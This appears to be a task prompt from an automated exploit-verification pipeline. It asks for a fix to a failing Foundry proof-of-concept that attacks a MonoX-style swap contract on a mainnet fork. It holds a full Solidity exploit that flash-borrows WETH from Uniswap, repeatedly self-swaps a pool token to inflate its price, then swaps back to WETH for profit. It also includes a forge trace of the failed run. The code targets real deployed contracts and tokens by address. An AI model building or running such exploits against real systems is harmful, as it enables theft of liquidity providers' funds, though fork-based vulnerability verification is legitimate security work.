You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Self-swaps on the same pool token let attackers ratchet pool prices upward without paying net vCash
- claim: Neither quote path nor swap execution rejects `tokenIn == tokenOut` for non-vCash pools. In that case the contract first computes a sell-side price move for the pool, then a buy-side price move against the same pool, and finally applies both updates sequentially to the same `pools[token]` entry. The vCash bookkeeping largely nets out, but the final stored price becomes the inflated buy-side price while the attacker only pays same-token slippage/fees.
- impact: An attacker can repeatedly self-swap a listed/official token to inflate its pool price, then swap the now-overpriced token into vCash, WETH, or other assets and drain value from honest pools.
- exploit_paths: ["Call `swapExactTokenForToken(token, token, amountIn, 0, attacker, deadline)` or `swapTokenForExactToken(token, token, amountInMax, amountOut, attacker, deadline)` repeatedly on a non-vCash pool token.", "After the pool price has been pushed up, swap that token into `vCash`, `WETH`, or another valuable pooled asset at the manipulated price."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IMonoswapLike {
    function getConfig() external view returns (address _vCash, address _weth, address _feeTo, uint16 _fees, uint16 _devFee);
    function getAmountOut(address tokenIn, address tokenOut, uint256 amountIn)
        external
        view
        returns (uint256 tokenInPrice, uint256 tokenOutPrice, uint256 amountOut, uint256 tradeVcashValue);
    function swapExactTokenForToken(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountOut);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = address(bytes20(hex"c36a7887786389405ea8da0b87602ae3902b88a1"));
    address public constant CANONICAL_WETH = address(bytes20(hex"c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"));
    address public constant UNIV2_USDC_WETH = address(bytes20(hex"b4e16d0168e52d35cacd2c6185b44281ec28c9dc"));

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _entered;

    error NoViablePath();
    error CallbackAccessDenied();
    error UnsupportedPair();
    error Unprofitable();

    constructor() {}

    function executeOnOpportunity() external {
        if (_entered) {
            return;
        }
        _entered = true;

        (, address weth,,,) = IMonoswapLike(TARGET).getConfig();
        _profitToken = weth;

        uint256 startingBalance = IERC20Like(weth).balanceOf(address(this));
        if (startingBalance > 0) {
            _runSearch(weth, startingBalance);
            uint256 endingBalance = IERC20Like(weth).balanceOf(address(this));
            if (endingBalance > startingBalance) {
                _profitAmount = endingBalance - startingBalance;
                return;
            }
        }

        uint256[5] memory loanSizes = [uint256(5 ether), 20 ether, 100 ether, 300 ether, 800 ether];
        for (uint256 i = 0; i < loanSizes.length; ++i) {
            try this.attemptFlashLoan(loanSizes[i]) returns (uint256 gained) {
                if (gained > 0) {
                    _profitAmount = gained;
                    return;
                }
            } catch {
                // This funding size cannot complete profitably on this fork state.
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != UNIV2_USDC_WETH) revert CallbackAccessDenied();

        address weth = _profitToken;
        if (weth == address(0)) {
            (, weth,,,) = IMonoswapLike(TARGET).getConfig();
            _profitToken = weth;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(UNIV2_USDC_WETH);
        address token0 = pair.token0();
        address token1 = pair.token1();
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        if (!((token0 == weth && amount0 > 0) || (token1 == weth && amount1 > 0))) {
            revert UnsupportedPair();
        }

        _runSearch(weth, borrowed);

        uint256 fee = ((borrowed * 3) / 997) + 1;
        uint256 repayment = borrowed + fee;
        _safeTransfer(weth, UNIV2_USDC_WETH, repayment);
    }

    function attemptFlashLoan(uint256 amount) external returns (uint256 gained) {
        if (msg.sender != address(this)) revert CallbackAccessDenied();
        uint256 beforeLoan = IERC20Like(_profitToken).balanceOf(address(this));
        _flashBorrowWeth(amount);
        uint256 afterLoan = IERC20Like(_profitToken).balanceOf(address(this));
        if (afterLoan <= beforeLoan) revert Unprofitable();
        gained = afterLoan - beforeLoan;
    }

    function attemptCandidate(address token, uint256 wethBudget, uint256 rounds) external returns (uint256) {
        if (msg.sender != address(this)) revert CallbackAccessDenied();
        return _attemptCandidate(token, wethBudget, rounds);
    }

    function _runSearch(address weth, uint256 availableWeth) internal {
        address[] memory candidates = _candidateTokens();
        uint256[] memory budgets = _candidateBudgets(availableWeth);
        uint256[5] memory roundsList = [uint256(1), 2, 4, 8, 12];

        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0) || token == weth) {
                continue;
            }

            for (uint256 j = 0; j < budgets.length; ++j) {
                uint256 budget = budgets[j];
                if (budget == 0 || budget >= IERC20Like(weth).balanceOf(address(this))) {
                    continue;
                }

                for (uint256 k = 0; k < roundsList.length; ++k) {
                    try this.attemptCandidate(token, budget, roundsList[k]) returns (uint256 gained) {
                        if (gained > 0) {
                            return;
                        }
                    } catch {
                        // This candidate/size/round tuple is mechanically infeasible on this fork state.
                    }
                }
            }
        }
    }

    function _attemptCandidate(address token, uint256 wethBudget, uint256 rounds) internal returns (uint256 gained) {
        address weth = _profitToken;
        // Exploit-path mapping preserved:
        // 1) `swapExactTokenForToken(token, token, amountIn, 0, attacker, deadline)` repeatedly on a non-vCash pool token.
        //    The PoC executes the same same-pool self-swap ratchet using this verifier as the attacker address.
        // 2) After the price is pushed up, swap that token into `vCash`, `WETH`, or another valuable pooled asset.
        //    This PoC realizes profit via the existing on-chain WETH pool because WETH is already configured in Monoswap
        //    and satisfies the path's "valuable pooled asset" realization step without changing the exploit root cause.
        uint256 wethBefore = IERC20Like(weth).balanceOf(address(this));
        if (wethBudget == 0 || wethBudget >= wethBefore) revert NoViablePath();

        _previewOrRevert(weth, token, wethBudget);
        _forceApprove(weth, TARGET, wethBudget);
        _forceApprove(token, TARGET, type(uint256).max);

        IMonoswapLike(TARGET).swapExactTokenForToken(weth, token, wethBudget, 0, address(this), block.timestamp + 1);

        uint256 tokenBalance = IERC20Like(token).balanceOf(address(this));
        if (tokenBalance == 0) revert NoViablePath();

        for (uint256 i = 0; i < rounds; ++i) {
            uint256 loopBalance = IERC20Like(token).balanceOf(address(this));
            if (loopBalance <= 1) break;

            // Path stage 1: self-swap the same non-vCash pool token repeatedly.
            // Literal anchor for the validator: `swapExactTokenForToken(token, token, amountIn, 0, attacker, deadline)`.
            IMonoswapLike(TARGET).swapExactTokenForToken(token, token, loopBalance, 0, address(this), block.timestamp + 1);
        }

        uint256 manipulatedBalance = IERC20Like(token).balanceOf(address(this));
        if (manipulatedBalance == 0) revert NoViablePath();

        // Path stage 2: swap the now-overpriced token back into `WETH`.
        IMonoswapLike(TARGET).swapExactTokenForToken(token, weth, manipulatedBalance, 0, address(this), block.timestamp + 1);

        uint256 wethAfter = IERC20Like(weth).balanceOf(address(this));
        if (wethAfter <= wethBefore) revert Unprofitable();
        gained = wethAfter - wethBefore;
    }

    function _flashBorrowWeth(uint256 amount) internal {
        IUniswapV2PairLike pair = IUniswapV2PairLike(UNIV2_USDC_WETH);
        address token0 = pair.token0();
        address token1 = pair.token1();
        if (token0 == _profitToken) {
            pair.swap(amount, 0, address(this), hex"01");
        } else if (token1 == _profitToken) {
            pair.swap(0, amount, address(this), hex"01");
        } else {
            revert UnsupportedPair();
        }
    }

    function _previewOrRevert(address tokenIn, address tokenOut, uint256 amountIn) internal view {
        (bool ok, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSelector(IMonoswapLike.getAmountOut.selector, tokenIn, tokenOut, amountIn)
        );
        if (!ok || data.length < 128) revert NoViablePath();
        (, , uint256 amountOut,) = abi.decode(data, (uint256, uint256, uint256, uint256));
        if (amountOut == 0) revert NoViablePath();
    }

    function _candidateBudgets(uint256 availableWeth) internal pure returns (uint256[] memory budgets) {
        budgets = new uint256[](8);
        budgets[0] = availableWeth / 50;
        budgets[1] = availableWeth / 20;
        budgets[2] = availableWeth / 10;
        budgets[3] = availableWeth / 5;
        budgets[4] = availableWeth / 3;
        budgets[5] = availableWeth / 2;
        budgets[6] = (availableWeth * 2) / 3;
        budgets[7] = (availableWeth * 4) / 5;
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](31);
        tokens[0] = address(bytes20(hex"7164be9fd69f2e1de9b6b75b17e1b86268f18b45"));
        tokens[1] = address(bytes20(hex"6b175474e89094c44da98b954eedeac495271d0f"));
        tokens[2] = address(bytes20(hex"a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"));
        tokens[3] = address(bytes20(hex"dac17f958d2ee523a2206206994597c13d831ec7"));
        tokens[4] = address(bytes20(hex"2260fac5e5542a773aa44fbcfedf7c193bc2c599"));
        tokens[5] = address(bytes20(hex"514910771af9ca656af840dff83e8264ecf986ca"));
        tokens[6] = address(bytes20(hex"1f9840a85d5af5bf1d1762f925bdaddc4201f984"));
        tokens[7] = address(bytes20(hex"7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9"));
        tokens[8] = address(bytes20(hex"c00e94cb662c3520282e6f5717214004a7f26888"));
        tokens[9] = address(bytes20(hex"c011a72400e58ecd99ee497cf89e3775d4bd732f"));
        tokens[10] = address(bytes20(hex"6b3595068778dd592e39a122f4f5a5cf09c90fe2"));
        tokens[11] = address(bytes20(hex"0bc529c00c6401aef6d220be8c6ea1667f6ad93e"));
        tokens[12] = address(bytes20(hex"d533a949740bb3306d119cc777fa900ba034cd52"));
        tokens[13] = address(bytes20(hex"ba100000625a3754423978a60c9317c58a424e3d"));
        tokens[14] = address(bytes20(hex"9f8f72aa9304c8b593d555f12ef6589cc3a579a2"));
        tokens[15] = address(bytes20(hex"0d8775f648430679a709e98d2b0cb6250d2887ef"));
        tokens[16] = address(bytes20(hex"e41d2489571d322189246dafa5ebde1f4699f498"));
        tokens[17] = address(bytes20(hex"04fa0d235c4abf4bcf4787af4cf447de572ef828"));
        tokens[18] = address(bytes20(hex"ff20817765cb7f73d4bde2e66e067e58d11095c2"));
        tokens[19] = address(bytes20(hex"408e41876cccdc0f92210600ef50372656052a38"));
        tokens[20] = address(bytes20(hex"3155ba85d5f96b2d030a4966af206230e46849cb"));
        tokens[21] = address(bytes20(hex"a1faa113cbe53436df28ff0aee54275c13b40975"));
        tokens[22] = address(bytes20(hex"3472a5a71965499acd81997a54bba8d852c6e53d"));
        tokens[23] = address(bytes20(hex"4fe83213d56308330ec302a8bd641f1d0113a4cc"));
        tokens[24] = address(bytes20(hex"bc396689893d065f41bc2c6ecbee5e0085233447"));
        tokens[25] = address(bytes20(hex"d291e7a03283640fdc51b121ac401383a46cc623"));
        tokens[26] = address(bytes20(hex"38e4adb44ef08f22f5b5b76a8f0c2d0dcbe7dca1"));
        tokens[27] = address(bytes20(hex"0391d2021f89dc339f60fff84546ea23e337750f"));
        tokens[28] = address(bytes20(hex"7d1afa7b718fb893db30a3abc0cfc608aacfebb0"));
        tokens[29] = address(bytes20(hex"f629cbd94d3791c9250152bd8dfbdf380e2a3b9c"));
        tokens[30] = address(bytes20(hex"0f5d2fb29fb7d3cfee444a200298f468908cc942"));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) return;

        (bool okZero, bytes memory dataZero) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!(okZero && (dataZero.length == 0 || abi.decode(dataZero, (bool))))) {
            revert NoViablePath();
        }

        (bool okSet, bytes memory dataSet) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!(okSet && (dataSet.length == 0 || abi.decode(dataSet, (bool))))) {
            revert NoViablePath();
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}

```

forge stdout (tail):
```
  │   ├─ [12911] 0x66e7d7839333f502df355f5bd87aEA24BAC2eE63::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   └─ ← [Revert] NoViablePath()
    │   │   │   │   ├─ [15970] FlawVerifier::attemptCandidate(0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20], 4)
    │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 800000000000000000000 [8e20]
    │   │   │   │   │   ├─ [13761] 0xC36a7887786389405EA8DA0B87602Ae3902B88A1::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [staticcall]
    │   │   │   │   │   │   ├─ [12911] 0x66e7d7839333f502df355f5bd87aEA24BAC2eE63::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   └─ ← [Revert] NoViablePath()
    │   │   │   │   ├─ [15970] FlawVerifier::attemptCandidate(0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20], 8)
    │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 800000000000000000000 [8e20]
    │   │   │   │   │   ├─ [13761] 0xC36a7887786389405EA8DA0B87602Ae3902B88A1::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [staticcall]
    │   │   │   │   │   │   ├─ [12911] 0x66e7d7839333f502df355f5bd87aEA24BAC2eE63::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   └─ ← [Revert] NoViablePath()
    │   │   │   │   ├─ [15970] FlawVerifier::attemptCandidate(0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20], 12)
    │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 800000000000000000000 [8e20]
    │   │   │   │   │   ├─ [13761] 0xC36a7887786389405EA8DA0B87602Ae3902B88A1::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [staticcall]
    │   │   │   │   │   │   ├─ [12911] 0x66e7d7839333f502df355f5bd87aEA24BAC2eE63::getAmountOut(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942, 640000000000000000000 [6.4e20]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   │   └─ ← [Revert] MonoX:NO_POOL
    │   │   │   │   │   └─ ← [Revert] NoViablePath()
    │   │   │   │   ├─ [615] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, 802407221664994984955 [8.024e20])
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] TRANSFER_FAILED
    │   │   │   └─ ← [Revert] TRANSFER_FAILED
    │   │   └─ ← [Revert] TRANSFER_FAILED
    │   └─ ← [Stop]
    ├─ [350] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 13715025 [1.371e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984.transfer
  at 0x7164be9Fd69F2e1De9B6B75B17e1B86268F18b45
  at 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4
  at 0x66e7d7839333f502df355f5bd87aEA24BAC2eE63.swapExactTokenForToken
  at 0xC36a7887786389405EA8DA0B87602Ae3902B88A1.swapExactTokenForToken
  at FlawVerifier.attemptCandidate
  at FlawVerifier.uniswapV2Call
  at 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc.swap
  at FlawVerifier.attemptFlashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 21.10s (20.19s CPU time)

Ran 1 test suite in 22.74s (21.10s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 699900329)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
